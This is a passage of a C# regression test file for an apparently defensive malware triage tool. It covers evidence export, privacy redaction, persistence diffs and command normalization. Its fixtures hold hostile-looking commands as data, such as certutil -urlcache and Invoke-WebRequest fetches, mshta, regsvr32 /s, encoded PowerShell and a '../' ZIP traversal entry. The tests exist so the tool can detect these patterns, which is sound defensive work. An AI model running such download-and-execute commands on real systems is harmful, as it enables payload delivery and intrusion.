        Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", file);
        True(!BehaviorCorrelator.Correlate([E(1, "B"), E(2, "A")]).Any(e => e.Action == "ordered"), "out-of-order rule matched");
        True(!BehaviorCorrelator.Correlate([E(1, "A"), E(2, "B"), E(3, "BLOCK")]).Any(e => e.Action == "ordered"), "excluded rule matched");
        True(BehaviorCorrelator.Correlate([E(1, "A"), E(2, "B")]).Any(e => e.Action == "ordered" && e.Summary.Contains("rule_hash=")), "valid ordered rule did not match/hash");
    }
    finally { Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", null); File.Delete(file); }
}

static void TestUntrustedEvidenceExport()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-untrusted-" + Guid.NewGuid().ToString("N"));
    string secret = Path.GetTempFileName();
    try
    {
        File.WriteAllText(secret, "secret");
        var data = new CaseData("safe-case", "safe", "x", secret, "", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "", RawEvidenceFiles: [secret], PreservedFiles: [new(secret, secret, 6, Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(secret))).ToLowerInvariant(), "forged")]);
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json", IncludeRaw: true, IncludeSample: true, Compress: false));
        True(!Directory.Exists(Path.Combine(root, "sample")), "untrusted sample copied");
        True(!Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories).Any(p => Path.GetFileName(p) == Path.GetFileName(secret)), "untrusted evidence copied");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); File.Delete(secret); }
}

static void TestTamperedRawEvidence()
{
    string caseId = "case-tamper"; string trusted = Path.Combine(Path.GetTempPath(), "MRTW", caseId); string rawDir = Path.Combine(trusted, "raw_evidence"); string output = Path.Combine(Path.GetTempPath(), "mrtw-out-" + Guid.NewGuid().ToString("N"));
    try
    {
        Directory.CreateDirectory(rawDir); string raw = Path.Combine(rawDir, "trace.etl"); File.WriteAllText(raw, "changed");
        var data = new CaseData(caseId, caseId, "x", "", "", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "") { TrustedEvidenceRoot = trusted, RawEvidence = [new(raw, 3, new string('0', 64), "test")] };
        new CaseExportService().WriteCaseBundle(data, output, new ExportOptions("json", IncludeRaw: true, Compress: false));
        True(!File.Exists(Path.Combine(output, "raw_evidence", "trace.etl")), "tampered raw copied");
    }
    finally { if (Directory.Exists(trusted)) Directory.Delete(trusted, true); if (Directory.Exists(output)) Directory.Delete(output, true); }
}

static void TestPrivacyProfile()
{
    var profile = new ExecutionProfile("x", "exe", "none", null, "x", Environment.CurrentDirectory, 1, true, false, false, false, "observe", ExecuteTarget: false, PrivacyMode: true);
    Equal(true, profile.PrivacyMode);
}

static void TestPortablePrivacyRedaction()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-privacy-" + Guid.NewGuid().ToString("N"));
    string secretUser = Environment.UserName;
    string secretHost = Environment.MachineName;
    const string secretIp = "10.23.45.67";
    try
    {
        var now = DateTimeOffset.UtcNow;
        var evt = new TimelineEvent(1, TimeSpan.Zero, "probe", 7, EventCategory.Network, "Connect", $@"C:\Users\{secretUser}\probe", $"{secretHost} {secretIp}", EventSeverity.Low, "test", $"raw {secretUser} {secretHost} {secretIp}", CapturedAtUtc: now);
        var process = new ProcessNode("probe", 7, null, "guid", $@"C:\Users\{secretUser}\run.exe", $@"C:\Users\{secretUser}\run.exe", now, null, 1, 0, 0, 0);
        var network = new NetworkSession("probe", "localhost", secretIp, secretIp, 80, "TCP", TimeSpan.Zero, 0, 0, "", "");
        string evidencePath = $@"C:\Users\{secretUser}\evidence.etl";
        var data = new CaseData("privacy", "privacy", "probe", $@"C:\Users\{secretUser}\sample.exe", "hash", now, TimeSpan.Zero, null, [process], [evt], [new ArtifactItem("path", $@"C:\Users\{secretUser}\a", now, now, 1, secretHost, EventSeverity.Low)], [network], $"{secretUser} {secretHost} {secretIp}", RawEvidenceFiles: [evidencePath], PreservedFiles: [new(evidencePath, evidencePath, 1, "hash", "test")])
        {
            RawEvidence = [new(evidencePath, 1, "hash", "test")]
        };
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("all", PrivacyMode: true, IncludeRaw: true, Compress: true));
        string[] expected = ["case.json", "events.jsonl", "raw_events.jsonl", "timeline.csv", "artifacts.csv", "processes.csv", "network.csv", "report.html", "case.sqlite", "case_export.zip"];
        foreach (string name in expected) True(File.Exists(Path.Combine(root, name)), "privacy export missing " + name);
        AssertNoSecrets(Directory.EnumerateFiles(root, "*", SearchOption.TopDirectoryOnly).Where(p => !p.EndsWith(".zip", StringComparison.OrdinalIgnoreCase)), secretUser, secretHost, secretIp);
        var redacted = new CaseService().Load(Path.Combine(root, "case.json"));
        True(redacted.RawEvidence.Count == 0 && redacted.RawEvidenceFiles?.Count == 0 && redacted.PreservedFiles?.Count == 0, "privacy export retained evidence references");
        string extract = Path.Combine(root, "zip"); ZipFile.ExtractToDirectory(Path.Combine(root, "case_export.zip"), extract);
        AssertNoSecrets(Directory.EnumerateFiles(extract, "*", SearchOption.AllDirectories), secretUser, secretHost, secretIp);
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestSyntheticPersistenceConfigRoundTrip()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-synthetic-state-" + Guid.NewGuid().ToString("N"));
    try
    {
        var now = DateTimeOffset.UtcNow;
        var events = new[]
        {
            new TimelineEvent(1, TimeSpan.Zero, "synthetic.exe", 1, EventCategory.Task, "Scheduled Task Created", @"\\MRTW-Safe-Test", "synthetic only", EventSeverity.Medium, "Synthetic", "{}", CapturedAtUtc: now),
            new TimelineEvent(2, TimeSpan.FromSeconds(1), "synthetic.exe", 1, EventCategory.Service, "Service Configuration Changed", "MRTW-Safe-Test", "synthetic only", EventSeverity.Medium, "Synthetic", "{}", CapturedAtUtc: now),
            new TimelineEvent(3, TimeSpan.FromSeconds(2), "synthetic.exe", 1, EventCategory.Registry, "Proxy Setting Changed", @"HKCU\Software\MRTW\Synthetic", "synthetic only", EventSeverity.Medium, "Synthetic", "{}", CapturedAtUtc: now)
        };
        var data = new CaseData("synthetic-state", "synthetic-state", "synthetic.exe", "synthetic.exe", "hash", now, TimeSpan.Zero, null, [], events, [], [], "synthetic only");
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,sqlite", Compress: false));
        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal(3, loaded.Events.Count);
        True(loaded.Events.All(e => e.Source == "Synthetic"), "synthetic state roundtrip changed source");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestPersistenceSnapshotDiffAndExport()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-persistence-" + Guid.NewGuid().ToString("N"));
    try
    {
        var before = new SnapshotData(DateTimeOffset.UtcNow, [], [], [],
            [new("StartupFolder", "C:\\Startup\\old.lnk", "old.lnk", "C:\\old.exe", "a"),
             new("ScheduledTask", "\\Old", "Old", "C:\\old.exe", "a"),
             new("WindowsService", "OldSvc", "OldSvc", "C:\\old.exe", "a"),
             new("WmiSubscription", "binding:__eventfilter.name=\"old\"|commandlineeventconsumer.name=\"old\"", "OldFilter -> OldConsumer", "C:\\old.exe", "a"),
             new("WmiSubscription", "binding:__eventfilter.name=\"changed\"|commandlineeventconsumer.name=\"changed\"", "ChangedFilter -> ChangedConsumer", "C:\\old-wmi.exe", "a")]);
        var after = new SnapshotData(DateTimeOffset.UtcNow, [], [], [],
            [new("StartupFolder", "C:\\Startup\\new.lnk", "new.lnk", "C:\\Users\\alice\\new.exe", "b"),
             new("ScheduledTask", "\\Old", "Old", "C:\\changed.exe", "changed"),
             new("WindowsService", "OldSvc", "OldSvc", "C:\\old.exe", "changed"),
             new("WmiSubscription", "binding:__eventfilter.name=\"new\"|commandlineeventconsumer.name=\"new\"", "NewFilter -> NewConsumer", "C:\\Users\\alice\\new-wmi.exe", "b"),
             new("WmiSubscription", "binding:__eventfilter.name=\"changed\"|commandlineeventconsumer.name=\"changed\"", "ChangedFilter -> ChangedConsumer", "C:\\Users\\alice\\changed-wmi.exe", "changed")],
            [new CollectorHealth("StartupFolder", "degraded", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 513, 1, "read-only; limit=512; reason=entry-limit; retained=512; dropped=1"),
             new CollectorHealth("ScheduledTask", "access-denied", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 0, 0),
             new CollectorHealth("WindowsService", "available", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 1, 0),
             new CollectorHealth("WmiSubscription", "unavailable", DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, 0, 0)]);
        var diff = new SnapshotService().Diff(before, after);
        Equal(2, diff.AddedPersistenceEntries!.Count); Equal(3, diff.ModifiedPersistenceEntries!.Count); Equal(2, diff.DeletedPersistenceEntries!.Count);
        Equal(1, diff.AddedPersistenceEntries.Count(e => e.Surface == "WmiSubscription"));
        Equal(1, diff.ModifiedPersistenceEntries.Count(e => e.Surface == "WmiSubscription"));
        Equal(1, diff.DeletedPersistenceEntries.Count(e => e.Surface == "WmiSubscription"));
        var events = new[]
        {
            new TimelineEvent(1, TimeSpan.Zero, "snapshot", 0, EventCategory.Registry, "Persistence Created", "C:\\Users\\alice\\new.exe", "StartupFolder persistence target: C:\\Users\\alice\\new.exe", EventSeverity.High, "PersistenceSnapshot", "{}"),
            new TimelineEvent(2, TimeSpan.FromSeconds(1), "snapshot", 0, EventCategory.Task, "Persistence Modified", "\\Old", "ScheduledTask persistence target: C:\\changed.exe", EventSeverity.High, "PersistenceSnapshot", "{}"),
            new TimelineEvent(3, TimeSpan.FromSeconds(2), "snapshot", 0, EventCategory.Service, "Persistence Modified", "OldSvc", "WindowsService persistence target: C:\\old.exe", EventSeverity.High, "PersistenceSnapshot", "{}"),
            new TimelineEvent(4, TimeSpan.FromSeconds(3), "snapshot", 0, EventCategory.Registry, "Persistence Modified", "WMI ChangedFilter -> ChangedConsumer", "WmiSubscription persistence target: C:\\Users\\alice\\changed-wmi.exe", EventSeverity.High, "PersistenceSnapshot", "{}")
        };
        var correlated = BehaviorCorrelator.Correlate(events);
        True(correlated.Any(e => e.Action == "Persistence Established"), "persistence behavior was not correlated");
        var artifacts = correlated.Where(e => e.Category is EventCategory.Registry or EventCategory.Task or EventCategory.Service).GroupBy(e => e.Category).Select(g => new ArtifactItem(g.Key.ToString(), string.Join(',', g.Select(e => e.ObjectValue)), DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, g.Count(), "snapshot", EventSeverity.High)).ToArray();
        var data = new CaseData("p", "p", "sample", "C:\\Users\\alice\\sample.exe", "hash", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], correlated, artifacts, [], "", new CaseQuality("degraded", after.PersistenceQuality!, "not-applied", true));
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,sqlite,html", PrivacyMode: true, Compress: false));
        foreach (string file in new[] { "case.json", "case.sqlite", "report.html" }) True(File.Exists(Path.Combine(root, file)), "missing persistence export " + file);
        string json = File.ReadAllText(Path.Combine(root, "case.json"));
        True(json.Contains("Persistence Established"), "JSON omitted persistence behavior");
        True(json.Contains("entry-limit"), "JSON omitted persistence limit quality");
        True(!json.Contains("alice", StringComparison.OrdinalIgnoreCase), "privacy export leaked persistence target user");
        True(File.ReadAllText(Path.Combine(root, "report.html")).Contains("access-denied"), "HTML omitted persistence quality");
        using var connection = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")};Pooling=False"); connection.Open();
        using var command = connection.CreateCommand(); command.CommandText = "SELECT COUNT(*) FROM events WHERE action='Persistence Modified'";
        True(Convert.ToInt32(command.ExecuteScalar()) >= 1, "SQLite omitted persistence events");
        command.CommandText = "SELECT json FROM case_quality";
        True((Convert.ToString(command.ExecuteScalar()) ?? "").Contains("entry-limit"), "SQLite omitted persistence limit quality");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestPersistenceSurfaceTimeout()
{
    int canceled = 0;
    var result = SnapshotService.CapturePersistenceSurfaceForTest("FakeWmi", token =>
    {
        token.WaitHandle.WaitOne();
        Interlocked.Exchange(ref canceled, 1);
        token.ThrowIfCancellationRequested();
        return [];
    }, TimeSpan.FromMilliseconds(25));
    Equal("timeout", result.Health.Status);
    True(SpinWait.SpinUntil(() => Volatile.Read(ref canceled) == 1, TimeSpan.FromSeconds(1)), "timed-out persistence read continued after cancellation");
}

static void TestPersistenceSurfaceLimit()
{
    var fixture = Enumerable.Range(0, 513).Select(i => new PersistenceSnapshotEntry("Fixture", i.ToString(), i.ToString(), "target", i.ToString())).ToArray();
    foreach (string surface in new[] { "StartupFolder", "ScheduledTask", "WindowsService", "WmiSubscription" })
    {
        var result = SnapshotService.CapturePersistenceSurfaceForTest(surface, _ => fixture, TimeSpan.FromSeconds(1));
        Equal(512, result.Entries.Count); Equal("degraded", result.Health.Status); Equal(1L, result.Health.EventsDropped);
        True(result.Health.Message.Contains("reason=entry-limit"), surface + " omitted entry-limit reason");
    }
}

static void TestPersistenceTimeoutQuality()
{
    True(RuntimeCaseCollector.IsDegradedCollectorStatus("timeout"), "timeout must degrade collection quality");
    True(!RuntimeCaseCollector.IsDegradedCollectorStatus("available"), "available must not degrade collection quality");
}

static void TestWmiBindingNormalization()
{
    Equal("__eventfilter.name=\"mrtw\"", SnapshotService.NormalizeWmiReference("\\\\.\\root\\subscription:__EventFilter.Name=\"MRTW\""));
    Equal("commandlineeventconsumer.name=\"mrtw\"", SnapshotService.NormalizeWmiReference("CommandLineEventConsumer.Name=\"MRTW\""));
}

static void TestNonPeScriptTriage()
{
    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
    try
    {
        File.WriteAllText(path, "powershell -EncodedCommand QUJD\n$u='https://example.invalid/a'\n");
        var result = new StaticAnalysisService().Analyze(path);
        True(result.NonPeTriage is not null, "script did not receive triage");
        Equal("Script (PS1)", result.NonPeTriage!.Format);
        True(result.NonPeTriage.UrlCandidates.Single().Contains("example.invalid"), "script URL missing");
        True(result.NonPeTriage.EncodedContentMarkers.Count > 0, "encoded marker missing");
        True(!result.NonPeTriage.CanExecute, "script triage incorrectly allows execution");
    }
    finally { File.Delete(path); }
}

static void TestNonPeZipSafety()
{
    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".zip");
    try
    {
        using (var stream = File.Create(path)) using (var zip = new ZipArchive(stream, ZipArchiveMode.Create))
        {
            using (var safe = new StreamWriter(zip.CreateEntry("safe.txt").Open())) safe.Write("safe");
            using (var unsafeWriter = new StreamWriter(zip.CreateEntry("../escape.txt").Open())) unsafeWriter.Write("no");
        }
        var triage = new StaticAnalysisService().Analyze(path).NonPeTriage!;
        True(triage.ContainerEntries.Any(x => x.StartsWith("safe.txt")), "safe ZIP entry missing");
        True(triage.SafetyWarnings.Any(x => x.Contains("Unsafe entry path")), "traversal ZIP entry was not rejected");
    }
    finally { File.Delete(path); }
}

static void TestNonPeLnkAndCompoundTriage()
{
    string lnk = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".lnk");
    string msi = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".msi");
    string doc = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".doc");
    try
    {
        File.WriteAllBytes(lnk, Encoding.UTF8.GetBytes("L\0\0\0https://example.invalid/link cmd.exe /c harmless"));
        byte[] cfbf = new byte[512]; new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 }.CopyTo(cfbf, 0);
        File.WriteAllBytes(msi, cfbf); File.WriteAllBytes(doc, cfbf);
        var lnkResult = new StaticAnalysisService().Analyze(lnk).NonPeTriage!;
        True(lnkResult.Format.Contains("LNK"), "LNK format missing"); True(!lnkResult.CanExecute, "LNK is executable");
        True(new StaticAnalysisService().Analyze(msi).NonPeTriage!.Format.Contains("MSI"), "MSI CFBF format missing");
        True(new StaticAnalysisService().Analyze(doc).NonPeTriage!.Format.Contains("Office"), "legacy Office CFBF format missing");
    }
    finally { File.Delete(lnk); File.Delete(msi); File.Delete(doc); }
}

static void TestNonPeStaticExport()
{
    string source = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".vbs");
    string root = Path.Combine(Path.GetTempPath(), "mrtw-nonpe-" + Guid.NewGuid().ToString("N"));
    try
    {
        File.WriteAllText(source, "CreateObject(\"WScript.Shell\").Run \"cmd.exe /c echo test\"");
        var result = new CaseRunner().Static(source, root, "json,csv");
        True(File.Exists(Path.Combine(root, Path.GetFileName(source) + "_" + result.Sha256[..8] + "_static", "initial_access_triage.json")), "non-PE JSON export missing");
        var redacted = new PrivacyRedactor().Redact(DemoCaseFactory.Create(source, result, 0));
        True(redacted.StaticAnalysis?.NonPeTriage is not null, "privacy transformation removed triage model");
    }
    finally { File.Delete(source); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestNonPeTriagePrivacyAcrossExports()
{
    const string userPath = @"C:\Users\triage-user\payload.ps1";
    const string privateIp = "10.23.45.67";
    const string unc = @"\\triage-host\share\dropper.zip";
    const string url = "https://triage.example.invalid/private";
    string root = Path.Combine(Path.GetTempPath(), "mrtw-nonpe-privacy-" + Guid.NewGuid().ToString("N"));
    try
    {
        var triage = new NonPeTriageResult("Script metadata " + userPath, false,
            ["indicator " + privateIp], [url], ["powershell " + unc + " " + url], ["base64 " + userPath], ["entry " + unc], ["warning " + privateIp + " " + url]);
        var staticResult = new StaticAnalysisResult("sample.ps1", userPath, 1, "m", "s1", "s256", "Script", "", null, "", [], [], [], [url, unc], false, false, 0, NonPeTriage: triage);
        var data = DemoCaseFactory.Create(userPath, staticResult, 0);
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("all", PrivacyMode: true, Compress: true));
        string[] secrets = ["triage-user", privateIp, "triage-host", "triage.example.invalid"];
        foreach (string path in Directory.GetFiles(root, "*", SearchOption.AllDirectories).Where(p => !p.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))) AssertNoSecretBytes(path, secrets);
        using var zip = ZipFile.OpenRead(Path.Combine(root, "case_export.zip"));
        foreach (var entry in zip.Entries)
        {
            using var reader = new StreamReader(entry.Open(), Encoding.UTF8, detectEncodingFromByteOrderMarks: true, leaveOpen: false);
            string content = reader.ReadToEnd();
            foreach (string secret in secrets) True(!content.Contains(secret, StringComparison.OrdinalIgnoreCase), "privacy ZIP leaked " + secret + " in " + entry.FullName);
        }
        using var connection = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")};Pooling=False"); connection.Open();
        using var command = connection.CreateCommand(); command.CommandText = "SELECT json FROM static_analysis";
        string sqliteJson = Convert.ToString(command.ExecuteScalar()) ?? string.Empty;
        foreach (string secret in secrets) True(!sqliteJson.Contains(secret, StringComparison.OrdinalIgnoreCase), "privacy SQLite leaked " + secret);
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestCoreRejectsNonPeExecution()
{
    string target = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".com");
    try
    {
        File.WriteAllBytes(target, [0x90, 0x90, 0xC3]); // inert DOS-like bytes; never executed.
        var analysis = new StaticAnalysisService().Analyze(target);
        True(analysis.NonPeTriage is not null, "fixture was not classified as non-PE");
        var profile = new ExecutionProfile(target, "exe", "none", null, $"\"{target}\"", Path.GetDirectoryName(target)!, 1,
            false, false, false, false, "observe", ExecuteTarget: true);
        try
        {
            new RuntimeCaseCollector().Collect(profile, analysis);
            throw new InvalidOperationException("Core accepted a non-PE target disguised as exe.");
        }
        catch (InvalidOperationException ex)
        {
            True(ex.Message.StartsWith("Execution skipped:", StringComparison.Ordinal), "Core rejection was not explicit.");
        }
        Throws<InvalidOperationException>(() => new CaseRunner().Run(profile, Path.Combine(Path.GetTempPath(), "mrtw-nonpe-exec-" + Guid.NewGuid().ToString("N")), "json"));
    }
    finally { File.Delete(target); }
}

static void TestCommandModeRejectsNonPeTarget()
{
    string target = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
    try
    {
        File.WriteAllText(target, "Write-Output harmless");
        var profile = new ExecutionProfile(target, "command", "none", null, "powershell -NoProfile -File \"" + target + "\"", Path.GetDirectoryName(target)!, 1,
            false, false, false, false, "observe", ExecuteTarget: true);
        var analysis = new StaticAnalysisService().Analyze(target);
        Throws<InvalidOperationException>(() => new RuntimeCaseCollector().Collect(profile, analysis));
        Throws<InvalidOperationException>(() => new CaseRunner().Run(profile, Path.Combine(Path.GetTempPath(), "mrtw-command-nonpe-" + Guid.NewGuid().ToString("N")), "json"));
    }
    finally { File.Delete(target); }
}

static void TestMalformedPeIsNonPe()
{
    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".exe");
    try
    {
        byte[] data = new byte[512]; data[0] = (byte)'M'; data[1] = (byte)'Z'; BitConverter.GetBytes(0x80).CopyTo(data, 0x3c); data[0x80] = (byte)'P'; data[0x81] = (byte)'E'; data[0x82] = (byte)'X'; data[0x83] = (byte)'X';
        File.WriteAllBytes(path, data);
        var result = new StaticAnalysisService().Analyze(path);
        True(result.NonPeTriage is not null, "malformed PE signature was accepted as PE");
        var profile = new ExecutionProfile(path, "exe", "none", null, "\"" + path + "\"", Path.GetDirectoryName(path)!, 1, false, false, false, false, "observe", ExecuteTarget: true);
        Throws<InvalidOperationException>(() => new RuntimeCaseCollector().Collect(profile, result));
    }
    finally { File.Delete(path); }
}

static void TestUtf16LnkTriage()
{
    string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".lnk");
    try
    {
        byte[] prefix = new byte[] { 0x4c, 0, 0, 0 };
        byte[] content = Encoding.Unicode.GetBytes(" https://utf16.example.invalid/a powershell.exe -NoProfile -Command harmless\0");
        File.WriteAllBytes(path, prefix.Concat(content).ToArray());
        var triage = new StaticAnalysisService().Analyze(path).NonPeTriage!;
        True(triage.UrlCandidates.Any(x => x.Contains("utf16.example.invalid")), "UTF-16 LNK URL candidate missing");
        True(triage.CommandCandidates.Any(x => x.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase)), "UTF-16 LNK command candidate missing");
    }
    finally { File.Delete(path); }
}

static void TestStaticPrivacyNonPeOutputs()
{
    const string url = "https://static-private.example.invalid/a";
    const string user = "static-private-user";
    const string privateIp = "192.168.88.77";
    string source = Path.Combine(Path.GetTempPath(), "mrtw-static-private-" + Guid.NewGuid().ToString("N") + ".ps1");
    string root = Path.Combine(Path.GetTempPath(), "mrtw-static-privacy-" + Guid.NewGuid().ToString("N"));
    try
    {
        File.WriteAllText(source, $"# C:\\Users\\{user}\\a.ps1\npowershell -EncodedCommand {url} {privateIp}");
        new CaseRunner().Static(source, root, "csv", "raw-static", privacyMode: false);
        string rawCsv = File.ReadAllText(Path.Combine(root, "raw-static", "initial_access_triage.csv"));
        True(rawCsv.Contains("encoded_marker", StringComparison.Ordinal) && rawCsv.Contains("-EncodedCommand", StringComparison.OrdinalIgnoreCase), "normal static CSV omitted encoded-content marker");
        new CaseRunner().Static(source, root, "all", "privacy-static", privacyMode: true);
        string directory = Path.Combine(root, "privacy-static");
        True(File.ReadAllText(Path.Combine(directory, "static_report.html")).Contains("Initial Access Triage"), "static HTML omitted Initial Access Triage");
        True(File.ReadAllText(Path.Combine(directory, "initial_access_triage.csv")).Contains("encoded_marker", StringComparison.Ordinal), "privacy static CSV omitted encoded-content marker");
        string[] secrets = [user, "static-private.example.invalid", privateIp];
        foreach (string path in Directory.GetFiles(directory, "*", SearchOption.AllDirectories).Where(p => !p.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))) AssertNoSecretBytes(path, secrets);
        using var zip = ZipFile.OpenRead(Path.Combine(directory, "case_export.zip"));
        foreach (var entry in zip.Entries)
        {
            using var reader = new StreamReader(entry.Open(), Encoding.UTF8, detectEncodingFromByteOrderMarks: true, leaveOpen: false);
            string content = reader.ReadToEnd();
            foreach (string secret in secrets) True(!content.Contains(secret, StringComparison.OrdinalIgnoreCase), "static privacy ZIP leaked " + secret + " in " + entry.FullName);
        }
    }
    finally { File.Delete(source); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestCliStaticPrivacyJsonLog()
{
    const string url = "https://cli-private.example.invalid/a";
    const string privateIp = "10.99.88.77";
    const string unc = @"\\cli-private-host\share\payload";
    string source = Path.Combine(Path.GetTempPath(), "mrtw-cli-private-" + Guid.NewGuid().ToString("N") + ".ps1");
    string root = Path.Combine(Path.GetTempPath(), "mrtw-cli-static-" + Guid.NewGuid().ToString("N"));
    try
    {
        File.WriteAllText(source, $"powershell -Command \"{url} {privateIp} {unc}\"");
        string cli = Path.Combine(FindRepositoryRoot(), "src", "MRTW.Cli", "bin", "Release", "net9.0", "MRTW.Cli.dll");
        True(File.Exists(cli), "CLI binary was not built for the integration check");
        using var process = Process.Start(new ProcessStartInfo
        {
            FileName = "dotnet", UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true,
            ArgumentList = { cli, "static", "--target", source, "--out", root, "--format", "json", "--privacy-mode", "on", "--log-format", "json" }
        }) ?? throw new InvalidOperationException("Could not start CLI privacy integration check.");
        string stdout = process.StandardOutput.ReadToEnd(); string stderr = process.StandardError.ReadToEnd(); process.WaitForExit();
        Equal(0, process.ExitCode); True(string.IsNullOrWhiteSpace(stderr), "CLI emitted unexpected stderr: " + stderr);
        foreach (string secret in new[] { "cli-private.example.invalid", privateIp, "cli-private-host", Environment.UserName }) True(!stdout.Contains(secret, StringComparison.OrdinalIgnoreCase), "privacy JSON log leaked " + secret);
    }
    finally { File.Delete(source); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestGuiEncodedMarkerBinding()
{
    string xaml = File.ReadAllText(Path.Combine(FindRepositoryRoot(), "src", "MRTW.App", "MainWindow.xaml"));
    True(xaml.Contains("StaticAnalysis.NonPeTriage.EncodedContentMarkers", StringComparison.Ordinal), "GUI triage omits encoded-content marker binding");
}

static void AssertNoSecretBytes(string path, IEnumerable<string> secrets)
{
    string content = Encoding.UTF8.GetString(File.ReadAllBytes(path));
    foreach (string secret in secrets) True(!content.Contains(secret, StringComparison.OrdinalIgnoreCase), "privacy export leaked " + secret + " in " + Path.GetFileName(path));
}

static void AssertNoSecrets(IEnumerable<string> paths, params string[] secrets)
{
    foreach (string path in paths)
    {
        string content = File.ReadAllText(path);
        foreach (string secret in secrets)
            True(!content.Contains(secret, StringComparison.OrdinalIgnoreCase), $"privacy export leaked {secret} in {Path.GetFileName(path)}");
    }
}

static string FindRepositoryRoot()
{
    for (var current = new DirectoryInfo(Directory.GetCurrentDirectory()); current is not null; current = current.Parent)
        if (File.Exists(Path.Combine(current.FullName, "MRTW.sln"))) return current.FullName;
    throw new DirectoryNotFoundException("MRTW.sln not found.");
}

static void TestEvidenceGenerationCollision()
{
    string caseId = "case-generation-" + Guid.NewGuid().ToString("N"); string source = Path.GetTempFileName(); string root = Path.Combine(Path.GetTempPath(), "MRTW", caseId);
    try
    {
        var service = new SnapshotService(); File.WriteAllText(source, "before"); var info = new FileInfo(source);
        var first = new FileSnapshotEntry(source, info.Length, info.LastWriteTimeUtc);
        var before = service.PreserveChangedFiles(new SnapshotDiff([first], [], [], [], [], [], []), caseId, "before").Single();
        File.WriteAllText(source, "after"); info.Refresh(); var second = new FileSnapshotEntry(source, info.Length, info.LastWriteTimeUtc);
        var after = service.PreserveChangedFiles(new SnapshotDiff([second], [], [], [], [], [], []), caseId, "after").Single();
        True(!before.StoredPath.Equals(after.StoredPath, StringComparison.OrdinalIgnoreCase), "before/after evidence paths collided");
        Equal("before", File.ReadAllText(before.StoredPath)); Equal("after", File.ReadAllText(after.StoredPath));
    }
    finally { File.Delete(source); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static TimelineEvent E(int id, string action) =>
    new(id, TimeSpan.FromMilliseconds(id), "sample.exe", 7, EventCategory.Api, action, "", "",
        EventSeverity.Medium, "Regression", "{}", CapturedAtUtc: DateTimeOffset.UtcNow);

static void TestCommandNormalization()
{
    string text = "Invoke-WebRequest https://example.invalid/a";
    string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(text));
    var powershell = CommandNormalizationService.Normalize("powershell.exe -EncodedCommand " + encoded).Single();
    Equal("decoded", powershell.Status); Equal(text, powershell.Normalized); Equal("powershell", powershell.LolBin);
    string utf8 = Convert.ToBase64String(Encoding.UTF8.GetBytes("certutil -urlcache -split -f https://example.invalid/b"));
    var from = CommandNormalizationService.Normalize("[Convert]::FromBase64String('" + utf8 + "')").Single();
    Equal("decoded", from.Status); True(from.Normalized.Contains("certutil", StringComparison.Ordinal), "FromBase64String was not decoded");
    foreach (string bin in new[] { "certutil -decode a b", "rundll32 x.dll,Entry", "regsvr32 /s x.sct", "mshta https://example.invalid" })
        True(!string.IsNullOrEmpty(CommandNormalizationService.Normalize(bin).Single().LolBin), "LOLBIN was not identified");
}

static void TestCommandNormalizationBounds()
{
    Equal("failed", CommandNormalizationService.Normalize("pwsh -enc AAAA").Single().Status);
    Equal("bounded", CommandNormalizationService.Normalize("x" + new string('a', 16 * 1024)).Single().Status);
    string binary = Convert.ToBase64String(new byte[] { 0, 0, 0, 0 });
    Equal("failed", CommandNormalizationService.Normalize("powershell -enc " + binary).Single().Status);
    // The service returns data only; this test deliberately supplies no executable target or invocation path.
}

static void TestNormalizedCommandExport()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-normalized-" + Guid.NewGuid().ToString("N"));
    try
    {
